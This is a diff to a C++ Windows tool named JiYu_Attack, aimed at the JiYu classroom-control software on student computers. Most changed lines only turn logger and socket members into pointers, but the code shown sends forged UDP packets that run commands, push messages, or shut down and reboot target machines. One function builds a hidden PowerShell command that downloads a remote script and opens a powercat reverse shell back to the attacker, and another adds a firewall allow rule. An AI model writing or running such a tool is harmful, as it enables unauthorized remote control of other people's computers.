@@ -39,7 +39,7 @@ class Logger {
         int curLevel = WARNING;
 };
 
-std::string execCmd(std::string cmd, Logger logger);
+std::string execCmd(std::string cmd, Logger* logger);
 
 int strToInt(std::string str);
 
@@ -62,7 +62,7 @@ ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets);
 
 class ISocket {
     public:
-        ISocket(Logger logger);
+        ISocket(Logger* logger);
         ~ISocket();
         std::string localIP = "";
         std::vector<std::string> getLocalIPs();
@@ -72,7 +72,7 @@ class ISocket {
         WSADATA wsd;
         int optval = 1;
         SOCKET client;
-        Logger logger;
+        Logger* logger;
 };
 
 class JiYu_Attack {
@@ -87,7 +87,7 @@ class JiYu_Attack {
             SHUTDOWN
         };
         static const std::string nc_ps_url;
-        ISocket client;
+        ISocket* client;
         std::vector<std::string> IPParser(std::string rawIP);
         int sendCmd(std::string rawIP, int port, std::string cmd);
         int sendMsg(std::string rawIP, int port, std::string msg);
@@ -98,7 +98,7 @@ class JiYu_Attack {
         int continueScreenControl();
     
     private:
-        Logger logger;
+        Logger* logger;
 };
 
 DWORD WINAPI netcat_remote(LPVOID lpParameter);
@@ -140,7 +140,7 @@ void Logger::log(int level, std::string content, Args... args) {
 #define popen _popen
 #define pclose _pclose
 
-std::string execCmd(std::string cmd, Logger logger) {
+std::string execCmd(std::string cmd, Logger* logger) {
     char buf_ps[1024] = {};
     char ps[1024] = {0};
     char result[2048] = {};
@@ -156,7 +156,7 @@ std::string execCmd(std::string cmd, Logger logger) {
         return result;
     }
     else {
-        logger.log(Logger::IERROR, "Failed to popen %s", ps);
+        logger->log(Logger::IERROR, "Failed to popen %s", ps);
         return "";
     }
 }
@@ -208,15 +208,15 @@ ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets) {
     return ParamRet();
 }
 
-ISocket::ISocket(Logger logger): logger(logger) {
+ISocket::ISocket(Logger* logger): logger(logger) {
     if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
-        logger.log(Logger::IERROR, "执行 WSAStartup 失败。");
+        logger->log(Logger::IERROR, "执行 WSAStartup 失败。");
         return;
     }
 
     client = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if(client <= 0) {
-        logger.log(Logger::IERROR, "Socket 客户端启动失败。");
+        logger->log(Logger::IERROR, "Socket 客户端启动失败。");
         return;
     }
     setsockopt(client, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));
@@ -240,13 +240,13 @@ std::vector<std::string> ISocket::getLocalIPs() {
     std::vector<std::string> ret;
 
     if(gethostname(host, sizeof(host)) == SOCKET_ERROR) {
-        logger.log(Logger::IERROR, "执行 gethostname 失败。");
+        logger->log(Logger::IERROR, "执行 gethostname 失败。");
         return ret;
     }
 
     struct hostent *hp;
     if((hp = gethostbyname(host)) == NULL) {
-        logger.log(Logger::IERROR, "执行 gethostbyname 失败。");
+        logger->log(Logger::IERROR, "执行 gethostbyname 失败。");
         return ret;
     }
 
@@ -264,7 +264,7 @@ std::vector<int> ISocket::getStudentPorts(std::string IP) {
     std::regex pattern("[e]\\s*\\d{1,5}\\s*[C]");
     std::smatch matches;
     if(!std::regex_search(taskStudent, matches, pattern)){
-        logger.log(Logger::WARNING, "进程 StudentMain.exe 未找到。返回空结果。");
+        logger->log(Logger::WARNING, "进程 StudentMain.exe 未找到。返回空结果。");
         return ret;
     }
     std::string studentPID = matches[0];
@@ -296,14 +296,16 @@ int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
     int sendRes;
     sendRes = sendto(client, (const char*)&data[0], data.size() * sizeof(BYTE), 0, (sockaddr*)&dest_addr, sizeof(sockaddr));
     if(sendRes == -1) {
-        logger.log(Logger::IERROR, "发送失败。函数 sendto 出现问题。");
+        logger->log(Logger::IERROR, "发送失败。函数 sendto 出现问题。");
         return 1;
     }
     return 0;
 }
 
-JiYu_Attack::JiYu_Attack(): logger(stdout), client(logger) {
-    logger.setLevel(Logger::IERROR);
+JiYu_Attack::JiYu_Attack() {
+    logger = new Logger(stdout);
+    logger->setLevel(Logger::IERROR);
+    client = new ISocket(logger);
 }
 
 const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
@@ -441,17 +443,21 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
         }
         return ret;
     }
-    logger.log(Logger::IERROR, "非法的 IP 地址格式。");
+    logger->log(Logger::IERROR, "非法的 IP 地址格式。");
     return ret;
 }
 
 int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
     int ret = 0;
     auto data = cmdCodePrefix[CMD];
+#ifdef _MSC_VER
     memcpy_s(&data[cmdContentBegin[CMD]], (data.size() - cmdContentBegin[CMD]) * sizeof(BYTE), &cmd[0], cmd.size() * sizeof(BYTE));
+#else
+    memcpy(&data[cmdContentBegin[CMD]], &cmd[0], cmd.size() * sizeof(BYTE));
+#endif
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -459,10 +465,14 @@ int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
 int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
     int ret = 0;
     auto data = cmdCodePrefix[MSG];
+#ifdef _MSC_VER
     memcpy_s(&data[cmdContentBegin[MSG]], (data.size() - cmdContentBegin[MSG]) * sizeof(BYTE), &msg[0], msg.size() * sizeof(BYTE));
+#else
+    memcpy(&data[cmdContentBegin[MSG]], &msg[0], msg.size() * sizeof(BYTE));
+#endif
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -472,7 +482,7 @@ int JiYu_Attack::sendShutdown(std::string rawIP, int port) {
     auto data = cmdCodePrefix[SHUTDOWN];
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -482,7 +492,7 @@ int JiYu_Attack::sendReboot(std::string rawIP, int port) {
     auto data = cmdCodePrefix[SHUTDOWN];
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -500,7 +510,7 @@ DWORD WINAPI netcat_remote(LPVOID lpParameter) {
         ncInfo.IP,
         ncInfo.port,
         "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('" + JiYu_Attack::nc_ps_url +
-        "');powercat -c " + ncInfo.jyAtk->client.localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
+        "');powercat -c " + ncInfo.jyAtk->client->localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
     );
     return 0;
 }
@@ -545,10 +555,6 @@ int JiYu_Attack::continueScreenControl() {
     system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
     return 0;
 }
-
-#else
-#error "Invalid system. Windows required."
-#endif // _WIN32
 
 auto jyAtk = new JiYu_Attack;
 
@@ -629,7 +635,7 @@ void startUI() {
             printf("输入额外选项：");
             std::cin >> extraOpt;
             if(extraOpt == "g") {
-                auto localIPs = jyAtk->client.getLocalIPs();
+                auto localIPs = jyAtk->client->getLocalIPs();
                 printf("你的本地 IP 地址：");
                 if(localIPs.size()) {
                     putchar('\n');
@@ -638,7 +644,7 @@ void startUI() {
                     }
                     std::vector<int> ports;
                     for(auto i: localIPs) {
-                        auto port = jyAtk->client.getStudentPorts(i);
+                        auto port = jyAtk->client->getStudentPorts(i);
                         ports.insert(ports.end(), port.begin(), port.end());
                     }
                     std::sort(ports.begin(), ports.end());
@@ -785,7 +791,7 @@ int main(int argc, char *argv[]) {
     auto extraOpt = GetParamfromParams("e", paramRets);
     if(extraOpt.exists) {
         if(extraOpt.value == "g") {
-            auto localIPs = jyAtk->client.getLocalIPs();
+            auto localIPs = jyAtk->client->getLocalIPs();
             printf("你的本地 IP 地址：");
             if(localIPs.size()) {
                 putchar('\n');
@@ -799,7 +805,7 @@ int main(int argc, char *argv[]) {
             }
             std::vector<int> ports;
             for(auto i: localIPs) {
-                auto port = jyAtk->client.getStudentPorts(i);
+                auto port = jyAtk->client->getStudentPorts(i);
                 ports.insert(ports.end(), port.begin(), port.end());
             }
             std::sort(ports.begin(), ports.end());
@@ -902,3 +908,7 @@ int main(int argc, char *argv[]) {
     printf("参数出现问题。请使用 -h 参数以获取帮助。\n");
     return 0;
 }
+
+#else
+#error "Invalid system. Windows required."
+#endif // _WIN32
